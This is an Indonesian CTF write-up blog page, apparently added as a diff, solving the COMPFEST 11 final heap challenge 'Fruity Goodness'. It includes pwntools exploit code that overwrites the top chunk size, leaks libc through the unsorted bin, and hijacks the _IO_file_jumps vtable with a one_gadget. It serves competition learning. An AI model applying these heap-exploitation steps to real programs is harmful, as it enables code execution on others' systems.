@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en-id">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<title>COMPFEST 11 Final - Fruity Goodness &middot; Kyra&#39;s Note</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+		
+		
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-146594173-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Kyra&#39;s Note" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Kyra&#39;s Note</h2>
+				</a>
+				<ul>
+    <li><a href="/about">About</a></li>
+    <li><a href="/">Posts</a></li>
+</ul>
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        circleous
+        <br>
+        <span>on&nbsp;</span><time datetime="2019-09-09 17:04:49 &#43;0700 WIB">September 9, 2019</time>
+</div>
+		<h1 class="post-title">COMPFEST 11 Final - Fruity Goodness</h1>
+<div class="post-line"></div>
+
+		
+
+		
+
+<blockquote>
+<p>hanya soal ini yang saya selesaikan selama ctf berlangsung, sad af.</p>
+</blockquote>
+
+<h1 id="analisa">analisa</h1>
+
+<pre><code>==================================================
+WELCOME TO FRUIT WAR v6.9
+I'm still a noob C coder :(, please report any bugs you find
+I'm also poor so i cant pay you :(
+Hopefully you have fun!
+==================================================
+1. I want a new fruit
+2. I want to train my fruit
+3. I want to list all my fruits
+4. I want out :(
+Your choice:
+</code></pre>
+
+<p>Soal heap dengan fungsi <code>view()</code>, <code>add()</code>, dan <code>edit()</code>, tanpa free/<code>delete()</code>. Struktur dari <code>fruit</code>,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> fruit {
+    <span style="color:#66d9ef">int</span> coolness;
+    <span style="color:#66d9ef">int</span> tastiness;
+    <span style="color:#66d9ef">int</span> number;
+    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> name;
+    <span style="color:#66d9ef">struct</span> fruit <span style="color:#f92672">*</span>next_fruit;
+    <span style="color:#66d9ef">int</span> level;
+}</code></pre></div>
+<p>Ada sedikit twist pada bagian <code>edit()</code> (menu train pada soal), dimana hanya bisa mengubah nama <code>fruit</code> ketika <code>fruit</code> coolneess dan tastiness lebih dari 50. Untuk menaikkan nilai coolneess dan tastiness ini, <code>fruit</code> perlu ditrain terlebih dahulu dengan pertambahan nilai yang random.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="display:block;width:100%;background-color:#3c3d38">    fruit_to_train<span style="color:#f92672">-&gt;</span>coolness <span style="color:#f92672">+=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span><span style="display:block;width:100%;background-color:#3c3d38">    fruit_to_train<span style="color:#f92672">-&gt;</span>tastiness <span style="color:#f92672">+=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span>    ...
+<span style="display:block;width:100%;background-color:#3c3d38">    <span style="color:#66d9ef">if</span> ( fruit_to_train<span style="color:#f92672">-&gt;</span>coolness <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">49</span> <span style="color:#f92672">||</span> fruit_to_train<span style="color:#f92672">-&gt;</span>tastiness <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">49</span> ) {
+</span>        puts(<span style="color:#e6db74">&#34;Fruit Trained!&#34;</span>);
+    }</code></pre></div>
+Bug terletak pada bagian <code>edit()</code>, karena dapat mengubah nama <code>fruit</code> tanpa ada batasan panjang yang sesuai pada pembuatan pertamanya.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    puts(<span style="color:#e6db74">&#34;Would you like to rename this fruit? (y/n)&#34;</span>);
+    fgets(choice, <span style="color:#ae81ff">5</span>, stdin);
+    <span style="color:#66d9ef">if</span> ( strchr(choice, <span style="color:#e6db74">&#39;y&#39;</span>) ) {
+        puts(<span style="color:#e6db74">&#34;How long do you want this fruit&#39;s name to be? (Max 4096 characters)&#34;</span>);
+<span style="display:block;width:100%;background-color:#3c3d38">        scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>length);
+</span>        getchar();
+        <span style="color:#66d9ef">if</span> ( length <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4096</span> ) {
+            puts(<span style="color:#e6db74">&#34;NO! BAD!&#34;</span>);
+            exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+        }
+        fruit_number <span style="color:#f92672">=</span> alloca(<span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> ((length <span style="color:#f92672">+</span> <span style="color:#ae81ff">15LL</span>) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x10uLL</span>));
+        p_new_name <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> (<span style="color:#f92672">*</span>)[])<span style="color:#f92672">&amp;</span>fruit_number;
+        puts(<span style="color:#e6db74">&#34;What do you want this fruit&#39;s name to be?&#34;</span>);
+<span style="display:block;width:100%;background-color:#3c3d38">        read(<span style="color:#ae81ff">0</span>, p_new_name, length);
+</span>        strncpy(fruit_to_train<span style="color:#f92672">-&gt;</span>name, p_new_name, length);
+    }</code></pre></div></p>
+
+<h1 id="exploit">exploit</h1>
+
+<p>Berikut beberapa fungsi untuk memudahkan interaksi dengan soal,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(length, name):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;choice:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, str(length))
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">train</span>(idx, length, name):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;choice:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;train?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, str(idx))
+    cond <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Trained!&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)
+    <span style="color:#66d9ef">while</span> cond:
+        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;choice:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;train?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, str(idx))
+        tmp <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)
+        cond <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Trained!&#39;</span> <span style="color:#f92672">in</span> tmp
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, str(length))
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>():
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;choice:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    dump <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#39;1. I want a new fruit&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>):
+        c <span style="color:#f92672">=</span> []
+        tmp <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)
+        <span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#39;========================================&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> tmp:
+            c<span style="color:#f92672">.</span>append(tmp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;: &#39;</span>))
+            tmp <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)
+        dump<span style="color:#f92672">.</span>append(c)
+    <span style="color:#66d9ef">return</span> dump</code></pre></div>
+<p>Ide pertamanya adalah mendapatkan leak libc dengan unsorted bin free list. Iya, walaupun gak ada <code>free()</code> di soal, free ini bisa didapat dengan mengalokasi chunk yang lebih besar daripada top chunk, cek lebih lanjut di stage 1 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c">house of orange</a>. btw, karena ada batasan malloc sebesar 0x1000, ubah dulu top chunk size jadi dibawah 0x1000.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">    add(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x47</span>)
+    add(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x17</span>)
+
+    <span style="color:#75715e">#  pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
+    <span style="color:#75715e"># 0000555555559260     0000000000000000 0000000000000000</span>
+    <span style="color:#75715e"># 0000555555559270     0000555555559290 00005555555592e0</span>
+    <span style="color:#75715e"># 0000555555559280     0000000000000000 0000000000000051</span>
+    <span style="color:#75715e"># 0000555555559290     4141414141414141 4141414141414141</span>
+    <span style="color:#75715e"># 00005555555592a0     4141414141414141 4141414141414141</span>
+    <span style="color:#75715e"># 00005555555592b0     4141414141414141 4141414141414141</span>
+    <span style="color:#75715e"># 00005555555592c0     4141414141414141 4141414141414141</span>
+    <span style="color:#75715e"># 00005555555592d0     0041414141414141 0000000000000031</span>
+    <span style="color:#75715e"># 00005555555592e0     0000000000000000 0000000000000001</span>
+    <span style="color:#75715e"># 00005555555592f0     0000555555559310 0000000000000000</span>
+    <span style="color:#75715e"># 0000555555559300     0000000000000000 0000000000000021</span>
+    <span style="color:#75715e"># 0000555555559310     4242424242424242 4242424242424242</span>
+    <span style="color:#75715e"># 0000555555559320     0042424242424242 0000000000020ce1 &lt;--- top chunk 0x20ce1</span>
+
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xe1\x0c\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># 0xce1</span>
+    train(<span style="color:#ae81ff">1</span>, len(payload), payload)
+
+    <span style="color:#75715e"># pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
+    <span style="color:#75715e"># ...</span>
+    <span style="color:#75715e"># 00005555555592f0     0000555555559310 0000000000000000</span>
+    <span style="color:#75715e"># 0000555555559300     0000000000000001 0000000000000021</span>
+    <span style="color:#75715e"># 0000555555559310     4242424242424242 4242424242424242</span>
+    <span style="color:#75715e"># 0000555555559320     4242424242424242 0000000000000ce1 &lt;--- top chunk 0x20ce1</span></code></pre></div>
+<p>Seharusnya alokasi malloc dengan ukuran lebih dari 0xce0, akan membuat heap pada page baru dan top chunk sebelumnya akan di free dan masuk ke unsorted bin.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">    add(<span style="color:#ae81ff">0xcf8</span>, <span style="color:#e6db74">&#39;C&#39;</span>)
+    <span style="color:#75715e"># pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
+    <span style="color:#75715e"># ...</span>
+    <span style="color:#75715e"># 00005555555592f0     0000555555559310 0000555555559330</span>
+    <span style="color:#75715e"># 0000555555559300     0000000000000001 0000000000000021</span>
+    <span style="color:#75715e"># 0000555555559310     4242424242424242 4242424242424242</span>
+    <span style="color:#75715e"># 0000555555559320     4242424242424242 0000000000000031</span>
+    <span style="color:#75715e"># 0000555555559330     0000000000000000 0000000000000002</span>
+    <span style="color:#75715e"># 0000555555559340     000055555557a010 0000000000000000</span>
+    <span style="color:#75715e"># 0000555555559350     0000000000000000 0000000000000c91</span>
+    <span style="color:#75715e"># 0000555555559360     000015555551cca0 000015555551cca0 &lt;--- libc leak</span></code></pre></div>
+<p>untuk dapetin leak-nya ubah <code>fruit-&gt;name</code> ke <code>...360</code>. <code>fruit-&gt;name</code> di entri ke 1 sudah menunjuk ke <code>...310</code> jadi yang perlu diubah hanya LSB-nya saja dari <code>0x10</code> jadi <code>0x60</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x60</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x60</span><span style="color:#e6db74">&#39;</span>
+    train(<span style="color:#ae81ff">0</span>, len(payload), payload)
+
+    <span style="color:#75715e"># pwndbg&gt; dq *(long*)$rebase(&amp;first_fruit) 40</span>
+    <span style="color:#75715e"># ...</span>
+    <span style="color:#75715e"># 00005555555592d0     4141414141414141 4141414141414141</span>
+    <span style="color:#75715e"># 00005555555592e0     4141414141414141 4141414141414141</span>
+    <span style="color:#75715e"># 00005555555592f0     0000555555559360 0000555555559330</span>
+    <span style="color:#75715e"># 0000555555559300     0000000000000001 0000000000000021</span>
+    <span style="color:#75715e"># 0000555555559310     4242424242424242 4242424242424242</span>
+    <span style="color:#75715e"># 0000555555559320     4242424242424242 0000000000000031</span>
+    <span style="color:#75715e"># 0000555555559330     0000000000000000 0000000000000002</span>
+    <span style="color:#75715e"># 0000555555559340     000055555557a010 0000000000000000</span>
+    <span style="color:#75715e"># 0000555555559350     0000000000000000 0000000000000c91</span>
+    <span style="color:#75715e"># 0000555555559360     000015555551cca0 000015555551cca0</span>
+    <span style="color:#75715e"># 0000555555559370     0000000000000000 0000000000000000</span>
+
+    leak <span style="color:#f92672">=</span> view()
+    leak <span style="color:#f92672">=</span> leak[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>][:<span style="color:#ae81ff">6</span>]
+    leak <span style="color:#f92672">=</span> u64(leak<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1e4ca0</span>
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;libc&#39;</span>, hex(libc<span style="color:#f92672">.</span>address)</code></pre></div>
+<p>Karena sudah mendapatkan leak libc, seharusnya sudah lebih mudah karena yang perlu dilakukan hanya mengubah <code>fruit-&gt;next_fruit-&gt;name</code> ke salah satu hook atau vtable di libc. Setelah itu tinggal ubah(<code>edit()</code>) nama di <code>fruit-&gt;next_fruit</code> jadi <code>one_gadget</code>. Pada exploit ini, saya menggunakan vtable dari std I/O, <code>_IO_file_jump</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x60</span>
+    payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1e65d8</span>) <span style="color:#75715e"># _IO_file_jump</span>
+    train(<span style="color:#ae81ff">0</span>, len(payload), payload)
+
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x58</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)
+    train(<span style="color:#ae81ff">0</span>, len(payload), payload) <span style="color:#75715e"># fix fruit-&gt;next_fruit-&gt;number</span>
+
+    payload  <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x106ef8</span>) <span style="color:#75715e"># one_gadget</span></code></pre></div>
+<p>profit.</p>
+
+<h1 id="the-real-challenge-dan-sedikit-rant">the real challenge dan sedikit rant</h1>
+
+<p>Soal ini terlihat mudah pada awalnya, tapi saya terjebak pada tahap akhir untuk mencari function pointer yang dapat dioverwrite pada libc. Teknik <em>spray n pray</em> disini juga ga bisa digunakan karena saat <code>edit()</code>, <code>read()</code> tidak langsung ke <code>fruit-&gt;name</code>, tapi lewat value di stack terlebih dahulu lalu <code>strncpy()</code> setelahnya ke heap. <code>strncpy</code> ini akan men-copy null terminated string dari src ke dst. plus, Pointer x86_64 selalu memiliki null dan itulah sebabnya kenapa tidak bisa spray one_gadget di libc.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">    read(<span style="color:#ae81ff">0</span>, p_new_name, length);
+    strncpy(fruit_to_train<span style="color:#f92672">-&gt;</span>name, p_new_name, length);</code></pre></div>
+<p>btw, saya baru ingat kalau vtable std I/O, <code>_IO_file_jump</code> ini writeable setelah membaca salah satu writeup dari bushwhackers - <a href="https://blog.bushwhackers.ru/tokyo2019-printf/">TokyoWesterns CTF 2019 - printf</a>, tapi sayangnya ini baru teringat pas 10 menit menjelang selesai.</p>
+
+<p>Lepas dari masalah mencari pointer yang bisa dioverwrite, <em>the real challenge</em> sebenarnya adalah membuat exploit ini lebih cepat karena <code>usleep</code> yang lumayan lama saat setiap kali <code>edit()</code>. Ini sebenarnya lebih mengganggu menurut saya karena terbukti selama 5 menit terakhir saya hanya mendapatkan 2 flag dari lawan, plus, instance pada soal ini yang hidup hanya beberapa dari semua tim (tidak ada waktu untuk lapor ke panitia &gt;.&lt;). btw, mungkin ini lebih kepada saran kepada para challenge designer kedepannya, kalau memang tidak menyangkut bagaimana soal ini dapat diselesaikan, lebih baik tidak ditambahkan kalau bisa :). Bukan menyalahkan penggunaan <code>usleep</code> disini karena untuk soal jeopardy yang bisa fire and forget, time limit bisa tidak perlu dipedulikan, tapi untuk attack defense yang menyangkut dengan tick dsb&hellip; ¯\_(ツ)_/¯</p>
+
+
+		
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'circleous';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+	</div>
+
+	<div class="pagination">
+		<a href="/posts/hacktoday-2019-final-pwn/" class="left arrow">&#8592;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			<span>
+			&copy; <time datetime="2019-09-09 21:45:37.417006982 &#43;0700 WIB m=&#43;0.147793466">2019</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
